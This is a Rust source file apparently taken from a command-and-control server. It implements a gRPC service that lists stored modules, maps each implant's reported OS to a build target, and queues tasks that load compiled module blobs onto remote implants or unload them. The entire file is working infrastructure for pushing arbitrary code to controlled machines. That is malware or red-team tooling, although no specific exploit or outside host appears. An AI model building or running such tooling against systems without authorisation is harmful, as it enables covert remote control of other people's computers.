//! ModuleService gRPC implementation

use std::sync::Arc;

use tonic::{Request, Response, Status};

use common::{ImplantId, TaskId};
use db::{ImplantRecord, TaskRecord};
use protocol::{
    DispatchTaskResponse, ListModulesRequest, ListModulesResponse, LoadModuleRequest,
    ModuleInfo as ProtoModuleInfo, ModuleService, ModuleTask, PlatformVersion as ProtoPlatformVersion,
    Task as ProtoTask, Timestamp, UnloadModuleRequest,
};
use prost::Message as ProstMessage;

use crate::error::ServerError;
use crate::state::ServerState;

pub struct ModuleServiceImpl {
    state: Arc<ServerState>,
}

impl ModuleServiceImpl {
    pub fn new(state: Arc<ServerState>) -> Self {
        Self { state }
    }
}

/// Determine the Rust target-triple platform string from an implant DB record.
///
/// The `os_name` field carries the OS name reported by the implant (e.g.
/// "windows", "linux", "macos").  We default to x86_64 architecture when no
/// architecture information is available in the record.
fn determine_platform(record: &ImplantRecord) -> String {
    let os = record
        .os_name
        .as_deref()
        .unwrap_or("")
        .to_lowercase();

    match os.as_str() {
        s if s.contains("windows") => "x86_64-pc-windows-gnu".to_string(),
        s if s.contains("linux") => "x86_64-unknown-linux-gnu".to_string(),
        s if s.contains("darwin") | s.contains("macos") => "aarch64-apple-darwin".to_string(),
        // Default: assume x86_64 Linux for unknown OS
        _ => "x86_64-unknown-linux-gnu".to_string(),
    }
}

/// Build a serialized `ModuleTask` proto for a load operation.
fn encode_load_task(module_blob: Vec<u8>) -> Result<Vec<u8>, Status> {
    use protocol::module_task::Operation;
    use protocol::ModuleLoad;

    let task = ModuleTask {
        operation: Some(Operation::Load(ModuleLoad { module_blob })),
    };
    let mut buf = Vec::new();
    task.encode(&mut buf)
        .map_err(|e| Status::internal(format!("failed to encode module load task: {e}")))?;
    Ok(buf)
}

/// Build a serialized `ModuleTask` proto for an unload operation.
fn encode_unload_task(module_id: String) -> Result<Vec<u8>, Status> {
    use protocol::module_task::Operation;
    use protocol::ModuleUnload;

    let task = ModuleTask {
        operation: Some(Operation::Unload(ModuleUnload { module_id })),
    };
    let mut buf = Vec::new();
    task.encode(&mut buf)
        .map_err(|e| Status::internal(format!("failed to encode module unload task: {e}")))?;
    Ok(buf)
}

/// Resolve an implant_id bytes vec to a validated `ImplantId` and fetch the DB record.
async fn get_implant(
    state: &ServerState,
    implant_id_bytes: &[u8],
) -> Result<(ImplantId, ImplantRecord), Status> {
    let implant_id = ImplantId::from_bytes(implant_id_bytes)
        .map_err(|e| Status::invalid_argument(format!("invalid implant_id: {e}")))?;

    let record = state
        .db
        .implants()
        .get(implant_id)
        .await
        .map_err(|e| Status::from(ServerError::from(e)))?
        .ok_or_else(|| Status::not_found(format!("implant {} not found", implant_id)))?;

    if !record.state.is_taskable() {
        return Err(Status::failed_precondition(format!(
            "implant {} is not in a taskable state (state={})",
            implant_id, record.state
        )));
    }

    Ok((implant_id, record))
}

/// Create and enqueue a task, returning the `DispatchTaskResponse`.
async fn dispatch(
    state: &ServerState,
    implant_id: ImplantId,
    task_type: &str,
    task_data: Vec<u8>,
) -> Result<Response<DispatchTaskResponse>, Status> {
    let system_operator_id = common::OperatorId::from_bytes(&[0u8; 16]).unwrap();
    let task_id = TaskId::new();
    let now = chrono::Utc::now().timestamp_millis();

    let task_record = TaskRecord {
        id: task_id,
        implant_id,
        operator_id: system_operator_id,
        task_type: task_type.to_string(),
        task_data: task_data.clone(),
        status: "queued".to_string(),
        issued_at: now,
        dispatched_at: None,
        completed_at: None,
        result_data: None,
        error_message: None,
    };

    state
        .db
        .tasks()
        .create(&task_record)
        .await
        .map_err(|e| Status::from(ServerError::from(e)))?;

    let proto_task = ProtoTask {
        task_id: Some(task_id.into()),
        task_type: task_type.to_string(),
        task_data,
        issued_at: Some(Timestamp::from_millis(now)),
        operator_id: Some(system_operator_id.into()),
    };
    state.enqueue_task(implant_id, proto_task);

    tracing::info!(
        task_id = %task_id,
        implant_id = %implant_id,
        task_type = task_type,
        "module task dispatched"
    );

    Ok(Response::new(DispatchTaskResponse {
        task_id: Some(task_id.into()),
    }))
}

#[tonic::async_trait]
impl ModuleService for ModuleServiceImpl {
    async fn list_modules(
        &self,
        _request: Request<ListModulesRequest>,
    ) -> Result<Response<ListModulesResponse>, Status> {
        let modules = self
            .state
            .module_store
            .list()
            .await
            .map_err(|e| Status::internal(format!("failed to list modules: {e}")))?;

        let proto_modules: Vec<ProtoModuleInfo> = modules
            .into_iter()
            .map(|m| ProtoModuleInfo {
                id: m.id,
                name: m.name,
                description: m.description,
                platforms: m
                    .platforms
                    .into_iter()
                    .map(|pv| ProtoPlatformVersion {
                        platform: pv.platform,
                        version: pv.version,
                        size: pv.size as u64,
                        compiled_at: pv.compiled_at,
                    })
                    .collect(),
            })
            .collect();

        Ok(Response::new(ListModulesResponse {
            modules: proto_modules,
        }))
    }

    async fn load_module(
        &self,
        request: Request<LoadModuleRequest>,
    ) -> Result<Response<DispatchTaskResponse>, Status> {
        let req = request.into_inner();

        let (implant_id, record) = get_implant(&self.state, &req.implant_id).await?;
        let platform = determine_platform(&record);

        let blob = self
            .state
            .module_store
            .get_blob(&req.module_id, &platform, req.version.as_deref())
            .await
            .map_err(|e| Status::not_found(format!("module blob not found: {e}")))?;

        tracing::info!(
            implant_id = %implant_id,
            module_id = %req.module_id,
            platform = %platform,
            blob_bytes = blob.len(),
            "loading module onto implant"
        );

        let task_data = encode_load_task(blob)?;
        dispatch(&self.state, implant_id, "module", task_data).await
    }

    async fn unload_module(
        &self,
        request: Request<UnloadModuleRequest>,
    ) -> Result<Response<DispatchTaskResponse>, Status> {
        let req = request.into_inner();

        let (implant_id, _record) = get_implant(&self.state, &req.implant_id).await?;

        tracing::info!(
            implant_id = %implant_id,
            module_id = %req.module_id,
            "unloading module from implant"
        );

        let task_data = encode_unload_task(req.module_id)?;
        dispatch(&self.state, implant_id, "module", task_data).await
    }
}
